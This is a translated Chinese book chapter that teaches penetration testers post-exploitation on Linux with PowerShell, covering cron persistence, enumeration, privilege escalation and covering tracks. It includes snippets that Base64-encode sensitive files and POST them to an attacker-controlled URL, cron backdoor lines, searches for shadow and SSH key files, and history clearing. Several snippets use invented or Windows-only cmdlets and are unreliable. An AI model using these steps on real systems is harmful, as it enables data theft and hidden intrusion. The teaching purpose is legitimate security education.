

# 第十六章：Linux 中的后渗透

本章将探讨 PowerShell 与 Linux 在后渗透领域中的强大协同作用。在一个传统上由原生 Linux 工具主导的环境中，PowerShell 的跨平台适应性成为改变游戏规则的关键，为安全专业人员提供了一个多功能的后渗透操作工具包。本章深入探讨了 PowerShell 在 Linux 环境中入侵后阶段的战略应用。

在我们开始这段旅程时，我们将揭示 PowerShell 在 Linux 系统中进行权限提升、横向移动和数据外泄中的作用。从分析用户、操控文件权限到利用漏洞，后渗透的每个方面都将通过详细的实例分析，展示 PowerShell 在模拟现实世界威胁中的有效性。

无论你是寻求理解并模拟潜在风险的道德黑客，还是希望加强 Linux 环境防御的防守者，本章将为你提供可操作的见解。加入我们，一同揭开 PowerShell 与 Linux 在后渗透阶段之间的动态相互作用，带你深入了解安全环境的复杂性，帮助你战略性地评估、防御并应对后渗透场景带来的挑战。

本章将涉及的主题如下：

+   渗透测试中 Linux 后渗透阶段的作用

+   Linux 中的后渗透

+   使用 PowerShell 在 Linux 中对用户进行分析

+   Linux 中的文件权限

+   在 Linux 中使用 PowerShell 进行权限提升

# 渗透测试中 Linux 后渗透阶段的作用

后渗透是 Linux 系统渗透测试中的一个关键阶段，在这一阶段，安全专业人员评估已获得的访问权限，并利用这些机会建立持久性、提升权限并收集有价值的信息。该阶段发生在初次突破之后，使测试人员能够模拟真实世界的攻击场景。

Linux 后渗透中的一个主要目标是实现并维持持久性。攻击者试图在被攻陷的系统上建立持久存在，确保即使在初步检测和修复尝试后，仍能继续访问。这可能涉及创建后门、修改启动脚本或安装恶意服务。

权限提升是后渗透阶段的另一个重点。Linux 系统采用各种用户账户，每个账户都分配有特定的权限。测试人员旨在提升权限，访问敏感数据、操控配置或执行关键系统命令。技术手段可能包括利用漏洞或配置错误，或是利用保护不力的服务。

信息收集在后渗透中起着关键作用。测试人员旨在收集关于受损系统的有价值数据，如用户账户、网络配置和正在运行的进程。通常使用`ps`、`netstat`和自定义脚本等工具来提取这些信息，帮助对目标环境进行侦察。

Linux 后渗透涉及在网络中进行横向移动。进入系统后，测试人员试图穿越互联系统，探索更广泛的网络。使用 SSH 隧道、端口转发和枢轴技术来进行横向移动，并识别额外的攻击目标。

在后渗透过程中，数据泄露是一个关键问题。测试人员模拟提取敏感信息，如用户凭据或机密文件，以评估安全控制的有效性。工具如`scp`、`rsync`或自定义脚本可以将数据传输到测试人员控制的外部服务器。

覆盖踪迹是 Linux 后渗透的一个重要方面。测试人员旨在删除或操纵日志和其他活动痕迹，以避免被检测到。这涉及修改日志文件、清除命令历史记录以及禁用或规避审计机制。

Linux 上的后渗透通常使用手动技术和自动化工具进行。常见工具包括 Metasploit、Empire 以及诸如 Python 或 Bash 等的各种脚本语言。安全专家需要理解 Linux 系统内部结构、文件结构和安全机制，以有效地在后渗透过程中导航和操作环境。

简而言之，在渗透测试中，Linux 上的后渗透包括建立持久性、提升权限、收集信息、横向移动、数据泄露和覆盖踪迹。安全专家利用各种技术和工具模拟现实世界的攻击，帮助组织识别和解决其基于 Linux 的系统中的漏洞。

# Linux 上的后渗透

PowerShell 主要与 Windows 环境相关联，在 Linux 上的功能有限。然而，随着 PowerShell Core（现在称为 PowerShell 7）的推出，即使在 Linux 上也可以使用 PowerShell 进行后渗透。尽管 Linux 上的 PowerShell 功能不如 Windows 那样广泛，但仍可以用于后渗透的特定任务。

## 建立持久性

在 Linux 上，可以通过设置 cron 作业定期执行 PowerShell 脚本来实现持久性。以下是一个基本的 cron 作业示例：

```
 # Edit crontab
crontab -e
# Add the following line to run a PowerShell script every minute
* * * * * /usr/bin/pwsh /path/to/persistence.ps1
```

`persistence.ps1` PowerShell 脚本可能包含用于维持访问或设置后门的代码。

## 提升权限

Linux 上的 PowerShell 可以用来检查潜在的权限提升机会。一种常见方法是识别具有提升权限的进程。以下是一个示例脚本：

```
 # Check for processes running with elevated privileges
Get-Process | Where-Object { $_.Elevated -eq $true } | Select-Object ProcessName, UserName
```

这个脚本列出运行时具有提升权限的进程，帮助识别潜在的权限提升目标。

## 枚举用户和组

Linux 上的 PowerShell 可以用来收集关于用户和组的信息。一个示例是列出所有用户及其组成员信息：

```
 # List all users and their groups
Get-LocalUser | ForEach-Object {
    $user = $_
    $groups = Get-LocalGroup -Member $user.Name | Select-Object -ExpandProperty Name
    "$($user.Name) : $($groups -join ', ')"
}
```

这个脚本检索本地用户及其组成员信息。

## 网络枚举

Linux 上的 PowerShell 可以帮助枚举网络信息。一个示例是列出网络接口及其配置：

```
 # List network interfaces and configurations
Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength
```

这个脚本提供了关于网络接口、IP 地址和前缀长度的信息。我们还可以使用以下方法来捕获 IP 地址信息：

```
 # List network interfaces and configurations
Invoke-Expression -Command "ip addr show"
```

## 文件和目录枚举

PowerShell 可以收集关于 Linux 系统中文件和目录的信息。一个示例是列出 `/etc` 目录中的文件：

```
 # List files in the /etc directory
Get-ChildItem -Path /etc
```

这个脚本枚举指定路径下的文件和目录。

## 数据外泄

Linux 上的 PowerShell 可以用来外泄数据。一个示例是将文件编码为 Base64 并发送到外部服务器：

```
 # Encode and exfiltrate a file
$fileContent = Get-Content /path/to/sensitive-file.txt -Raw
$encodedContent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
Invoke-RestMethod -Uri "http s://snowcap cyber.com/upload" -Method POST -Body $encodedContent
```

这个脚本将文件的内容编码为 Base64，并将其发送到攻击者控制的服务器。

## 掩盖痕迹

Linux 上的 PowerShell 可以通过修改或删除日志来掩盖痕迹。一个示例是清除 Bash 历史记录：

```
 # Clear Bash history
Clear-History
```

这个脚本删除命令历史记录，通过清除已执行命令的记录来掩盖痕迹。

需要注意的是，在 Linux 上使用 PowerShell 进行后期利用可能不如在 Windows 上熟悉或强大。Linux 系统通常具有本地工具和脚本语言，如 Bash，这些工具更为普遍且集成度更高。虽然在特定场景下可以使用 Linux 上的 PowerShell，但理解和利用 Linux 特有的工具通常更为有效。安全专业人员在选择 Linux 上的后期利用技术时，应了解上下文和环境。

# 在 Linux 上使用 PowerShell 对用户进行分析

在 Linux 上使用 PowerShell 对用户进行分析，涉及收集用户活动、权限和系统交互的详细信息。尽管 Linux 提供了本地工具和命令进行系统分析，但 PowerShell 可以通过提供一致且可脚本化的界面来补充这些工具，从而在不同平台上都能使用。

## 用户信息

Linux 上的 PowerShell 可以检索特定用户的信息，包括用户名、UID、GID、主目录和 Shell。以下是一个示例：

```
 # Get information about a specific user
Get-User -Name andrewblyth
```

这个假设的 cmdlet `Get-User` 检索名为 `andrewblyth` 的用户信息。

## 正在运行的进程

PowerShell 可以列出正在运行的进程，并根据用户进行筛选。这允许快速查看与特定用户相关的进程：

```
 # Get processes for a specific user
Get-Process | Where-Object { $_.UserName -eq "andrewblyth" }
```

这个脚本列出 `andrewblyth` 用户正在运行的进程。

## 网络连接

在 Linux 上使用 PowerShell 可以提供有关与用户关联的网络连接的见解。一个示例是列出特定用户的网络连接：

```
 # Get network connections for a specific user
Get-NetTCPConnection -OwningUser "andrewblyth"
```

此命令显示由用户`andrewblyth`拥有的 TCP 连接的信息。

## 文件和目录访问

分析涉及了解用户的文件和目录访问。PowerShell 可用于列出用户可以访问的文件和目录：

```
 # List files and directories for a specific user
Get-ChildItem -Path /home/andrewblyth
```

此脚本提供了用户家目录`andrewblyth`中文件和目录的列表。

## 安装的软件

PowerShell 可以查询 Linux 系统上安装的软件，允许对用户的软件环境进行分析。以下是使用假设的`Get-InstalledSoftware` cmdlet 的示例：

```
 # Get installed software for a specific user
Get-InstalledSoftware -User "andrewblyth"
```

此 cmdlet 将检索为用户`andrewblyth`安装的软件列表。

## 最近的活动

在 Linux 上使用 PowerShell 可以查询系统日志以收集有关用户最近活动的信息。一个示例是检索用户的最近登录事件：

```
 # Get recent login events for a specific user
Get-WinEvent -LogName auth.log -FilterXPath "*[System[(EventID=1) and EventData[Data[@Name='user']='$andrewblyth]]]" -MaxEvents 10
```

此示例从`auth.log`文件中检索用户`andrewblyth`的最后 10 个身份验证事件。

## 数据外泄

PowerShell 可以用于在 Linux 上进行数据外泄，使用各种技术。一种常见方法是将数据编码为 Base64 并通过网络发送。以下是一个假设的示例：

```
 # Encode and send data to a remote server
$data = "SensitiveData"
$encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
Invoke-WebRequest -Uri "https://snpowcapcyber.com.com/upload.php" -Method POST -Body $encodedData
```

此脚本将字符串`SensitiveData`编码为 Base64 并将其发送到受攻击者控制的服务器。

虽然提供的示例演示了 PowerShell 在 Linux 上对用户进行分析的潜在用途，但重要的是要注意，Linux 拥有丰富的本地工具和命令生态系统，更常用于这些任务。像`ps`、`ls`和`netstat`这样的命令以及`/var/log`中的日志通常提供所需信息，而无需使用 PowerShell。然而，在异构环境中，其中 PowerShell 用于其他任务，其跨平台性质可以在不同操作系统上提供一致的脚本编写和自动化。在考虑使用 PowerShell 在 Linux 上对用户进行分析时，应考虑环境的特定要求和上下文。

# Linux 中的文件权限

PowerShell，传统上被称为 Windows 环境的脚本语言，通过引入 PowerShell Core（PowerShell 7）扩展了其在 Linux 系统上的功能。虽然 Linux 主要依赖于本地工具和命令来处理文件和目录权限，但 PowerShell 可以在不同平台上提供一致的脚本接口。在这里，我们将探讨 PowerShell 在 Linux 上如何与文件权限交互。

## 查看文件权限

在 Linux 上，用户可以使用`Get-Acl` cmdlet 查看文件权限。看下面的示例：

```
 # Get file permissions for a specific file
Get-Acl /path/to/file.txt
```

此命令检索指定文件的**访问控制列表**（**ACL**），显示有关所有权和权限的详细信息。

## 授予文件权限

PowerShell 可以用于授予用户或组特定的权限。一个例子是授予用户读写权限：

```
 # Grant read and write permissions to a user
$filePath = "/path/to/file.txt"
$user = " andrewblyth "
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($user, "Read, Write", "Allow")
(Get-Acl $filePath).AddAccessRule($rule) | Set-Acl $filePath
```

该脚本创建了一个新的访问规则，授予`andrewblyth`用户在指定文件上的读写权限。

## 修改文件权限

PowerShell 在 Linux 上可以用于修改现有的文件权限。一个例子是为一个组添加执行权限：

```
 # Add execute permissions to a group
$filePath = "/path/to/file.sh"
$group = "developers"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($group, "ExecuteFile", "Allow")
(Get-Acl $filePath).AddAccessRule($rule) | Set-Acl $filePath
```

该脚本添加了一个访问规则，允许**开发者**组执行指定的脚本文件。

## 撤销文件权限

PowerShell 也可以用来撤销或删除文件权限。一个例子是从用户那里移除写权限：

```
 # Remove write permissions from a user
$filePath = "/path/to/data.txt"
$user = "alice"
$acl = Get-Acl $filePath
$rule = $acl.Access | Where-Object { $_.IdentityReference -eq $user -and $_.FileSystemRights -eq "Write" }
$acl.RemoveAccessRule($rule) | Set-Acl $filePath
```

该脚本识别并移除`alice`用户在指定文件上的写权限规则。

## 更改所有权

PowerShell 可以帮助更改文件的所有权。一个例子是将文件的所有者更改为另一个用户：

```
 # Change file ownership to a different user
$filePath = "/path/to/file.txt"
$newOwner = "andrewblyth"
(Get-Acl $filePath).SetOwner([System.Security.Principal.NTAccount] $newOwner) | Set-Acl $filePath
```

该脚本将指定文件的所有者设置为`andrewblyth`用户。

## 检查有效权限

PowerShell 在 Linux 上可以检查用户对文件的有效权限。以下是一个例子：

```
 # Check effective permissions for a user
$filePath = "/path/to/document.pdf"
$user = "guest"
(Get-Acl $filePath).Access | Where-Object { $_.IdentityReference -eq $user }
```

该命令检索并显示`guest`用户在指定文件上的有效权限。

## 继承权限

PowerShell 可以用于配置权限继承给子对象。一个例子是配置目录继承其父目录的权限：

```
 # Configure directory to inherit permissions
$directoryPath = "/path/to/folder"
$acl = Get-Acl $directoryPath
$acl.SetAccessRuleProtection($false, $true)
Set-Acl $directoryPath $acl
```

该脚本禁用目录的保护，并允许它继承父目录的权限。

## 检查访问控制列表（ACL）

PowerShell 在 Linux 上可以列出 ACL 中所有的**访问控制条目**（**ACE**）。以下是一个例子：

```
 # List all ACEs in an ACL
$filePath = "/path/to/data.txt"
(Get-Acl $filePath).Access
```

该命令检索并显示指定文件的 ACL 中所有的 ACE。虽然本地的 Linux 命令如`chmod`、`chown`和`getfacl`通常用于管理文件权限，但 Linux 上的 PowerShell 提供了一致的脚本体验，特别是在异构环境中。安全专业人员在选择本地工具和 PowerShell 进行文件权限管理时，应该考虑 Linux 系统的具体环境和需求。

# 在 Linux 中使用 PowerShell 进行权限提升

PowerShell，传统上与 Windows 环境相关联，已经通过 PowerShell Core 扩展到 Linux 系统。尽管 Linux 通常依赖本地工具和脚本语言（如 Bash）进行权限提升，但 Linux 上的 PowerShell 可以成为安全专业人员工具箱中的一个强大补充。本指南将探讨如何通过各种技术和示例使用 PowerShell 进行 Linux 中的权限提升。

## 检查当前用户的权限

在尝试权限提升之前，了解当前用户的权限是至关重要的。PowerShell 在 Linux 上可以检索关于当前用户的信息：

```
 # Check current user's privileges
whoami
```

这个简单的命令提供了当前用户的用户名，允许初步了解他们的权限。

## 枚举本地组和用户

识别本地组和用户是权限提升中的关键步骤。可以使用 PowerShell 枚举本地组及其成员：

```
 # Enumerate local groups and their members
Get-LocalGroup | ForEach-Object {
    $group = $_
    Write-Host "Group: $($group.Name)"
    Get-LocalGroupMember -Group $group.Name
}
```

此脚本列出了所有本地组及其成员，有助于识别潜在的权限提升目标。

## 检查 sudo 配置

检查 sudo 配置对于识别执行具有提升权限命令的机会至关重要。可以使用 PowerShell 查看`sudoers`文件：

```
 # Check sudoers file
cat /etc/sudoers
```

此命令显示`sudoers`文件的内容，揭示具有 sudo 权限的用户和命令配置。

## 检查可执行文件权限

识别具有宽松权限的可执行文件为权限提升提供了机会。可以使用 PowerShell 搜索具有可执行权限的文件：

```
 # Find executable files with lax permissions
Get-ChildItem -Path / -type f -executable | ForEach-Object {
    $file = $_
    Write-Host "Executable File: $($file.FullName)"
}
```

此脚本搜索可执行文件并列出那些可能存在弱权限的文件。

## 利用弱服务配置

一些服务可能存在配置错误，可被利用进行权限提升。PowerShell 可以帮助识别服务及其配置：

```
 # Check for services with weak configurations
Get-Service | ForEach-Object {
    $service = $_
    Write-Host "Service: $($service.DisplayName), StartType: $($service.StartType)"
}
```

此脚本列出了服务及其启动类型，帮助识别具有配置错误的服务。

## 利用 crontab 条目

可以操控 cron 作业来进行权限提升。可以使用 PowerShell 列出并分析 cron 作业：

```
 # List cron jobs
crontab -l
```

此命令显示当前用户的`cron`作业，提供有关可能被利用的计划任务的信息。

## 利用全局可写目录

具有全局可写权限的目录可能提供权限提升的机会。可以使用 PowerShell 查找此类目录：

```
 # Find world-writable directories
Get-ChildItem -Path / -type d | Where-Object { $_.Attributes -match "OtherWrite" } | ForEach-Object {
    $dir = $_
    Write-Host "World-Writable Directory: $($dir.FullName)"
}
```

此脚本识别具有全局可写权限的目录，这些目录可能被利用来进行权限提升。

## DLL 劫持

DLL 劫持涉及操控动态链接库的搜索路径。可以使用 PowerShell 查找可能受到 DLL 劫持攻击的进程：

```
 # Identify processes with DLL hijacking potential
Get-Process | ForEach-Object {
    $process = $_
    $dllPath = Join-Path $process.MainModule.FileName -ChildPath "evil.dll"
    if (-not (Test-Path $dllPath)) {
        Write-Host "Potential DLL hijacking found in $($process.ProcessName). Exploiting..."     }
}
```

此脚本检查每个正在运行的进程，查找潜在的 DLL 劫持机会，并在发现时发出警报。

## 密码文件和敏感信息

搜索密码文件或敏感信息是常见的权限提升策略。可以使用 PowerShell 查找特定的文件：

```
 # Search for password files
Get-ChildItem -Path / -type f -name "passwd*" -or -name "shadow" -or -name "sudoers" -or -name "id_rsa" -or -name "id_dsa" -or -name "*.key"
```

此脚本搜索与密码或敏感信息相关的文件。

## 利用通配符注入

命令中的通配符可能导致意外后果。可以使用 PowerShell 检查通配符注入漏洞：

```
 # Check for wildcard injection vulnerabilities
Get-ChildItem -Path / -include "*.log*" -Recurse
```

此脚本搜索与`.log`模式匹配的文件，有助于识别潜在的通配符注入漏洞。

## 利用 setuid 和 setgid 二进制文件

`setuid`和`setgid`二进制文件以文件所有者的权限执行。可以使用 PowerShell 查找此类二进制文件：

```
 # Find setuid and setgid binaries
find / -type f -perm /4000 -or -perm /2000 2>/dev/null
```

此命令列出了`setuid`和`setgid`二进制文件，可能为权限提升提供机会。

## 利用环境变量

环境变量可以影响程序行为。可以使用 PowerShell 来检查环境变量：

```
 # Check environment variables
Get-ChildItem -Path /proc/*/environ -type f | ForEach-Object {
    $envContents = Get-Content $_.FullName
    Write-Host "Environment Variables in $($_.FullName):"
    Write-Host $envContents
}
```

该脚本检索 `/proc` 目录中环境变量文件的内容，帮助识别可能被利用的变量。

PowerShell 在 Linux 上为安全专家提供了一种跨平台的脚本语言，可以与原生的 Linux 工具一起用于权限提升。虽然传统的 Linux 命令和脚本语言常被优先使用，但 PowerShell 在各个平台上的一致性使其成为安全评估和渗透测试中混合环境中工具箱的一个宝贵补充。安全专家应根据他们的 Linux 系统的具体情况，选择最合适的工具和技术进行权限提升。

到这里，我们已经完成了本书的内容。恭喜你成功完成了这本书！
